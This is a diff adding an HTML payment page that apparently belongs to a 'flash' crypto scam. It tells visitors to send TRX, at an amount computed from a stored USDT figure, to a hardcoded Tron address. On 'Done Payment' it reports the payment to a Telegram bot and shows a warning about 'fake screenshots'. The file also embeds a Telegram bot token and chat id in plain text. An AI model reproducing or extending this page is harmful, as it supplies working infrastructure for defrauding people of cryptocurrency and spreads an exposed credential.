@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>TRX Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: #FFD700;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+    }
+
+    .glass-box {
+      background: rgba(0, 0, 0, 0.75);
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 0 20px #000;
+      border: 1px solid rgba(255,255,255,0.15);
+      text-align: center;
+      position: relative;
+    }
+
+    .icon {
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 2px solid #FFD70088;
+      margin-bottom: 20px;
+    }
+
+    .pay-info {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #FFD70033;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 18px;
+      margin-bottom: 20px;
+      text-shadow: 0 0 4px #000;
+    }
+
+    .copy-box {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #FFD70033;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      overflow-wrap: anywhere;
+      margin-bottom: 20px;
+    }
+
+    .copy-box span {
+      flex: 1;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    .copy-btn {
+      background: #FFD700;
+      color: #000;
+      border: none;
+      padding: 6px 10px;
+      border-radius: 8px;
+      margin-left: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .btn-done {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(to right, #FFD700, #e6c300);
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn-done:hover {
+      background: #FFD700;
+    }
+
+    .loader-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      border-radius: 20px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 10;
+    }
+
+    .loader-circle {
+      width: 120px;
+      height: 120px;
+      border: 6px solid #FFD700;
+      border-top: 6px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .loader-text {
+      color: #FFD700;
+      font-weight: bold;
+      text-align: center;
+      max-width: 200px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="glass-box">
+      <img src="trx.png" alt="TRX" class="icon" />
+
+      <div class="pay-info" id="payText">COPY ADDRESS AND PAY IT: ... TRX</div>
+
+      <div class="copy-box">
+        <span id="trxAddress">TMCaWESmnXNRJ4XMKXE4Av26GYPyB6oL7Y</span>
+        <button class="copy-btn" onclick="copyAddress()">COPY</button>
+      </div>
+
+      <button class="btn-done" onclick="showLoader()">Done Payment</button>
+
+      <div class="loader-overlay" id="loader">
+        <div class="loader-circle"></div>
+        <div class="loader-text">fake screenshots<br>block software</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const usdt = parseFloat(localStorage.getItem("amount_usdt") || "0");
+    const flash = parseFloat(localStorage.getItem("flash_bsc") || "0");
+    const rate = 3.8;
+    const trxAmount = (usdt * rate).toFixed(2);
+
+    document.getElementById("payText").innerText = `Copy address below and pay ${trxAmount} TRX`;
+
+    function copyAddress() {
+      const addr = document.getElementById("trxAddress").innerText;
+      navigator.clipboard.writeText(addr).then(() => {
+        alert("Address copied!");
+      });
+    }
+
+    function showLoader() {
+      document.getElementById("loader").style.display = "flex";
+
+      const message = `💸 TRX PAYMENT\nAmount: ${trxAmount} TRX\nFlash: ${flash} BSC FLASH\nPaid for ${usdt} USDT`;
+
+      fetch("https://api.telegram.org/bot7541294448:AAEbnzKns8iQnv01Q6wgTmRyNhqEBDpxCqo/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "7739393558",
+          text: message
+        })
+      });
+
+      setTimeout(() => {
+        window.location.href = "confirm.html";
+      }, 5000);
+    }
+  </script>
+
+</body>
+</html>
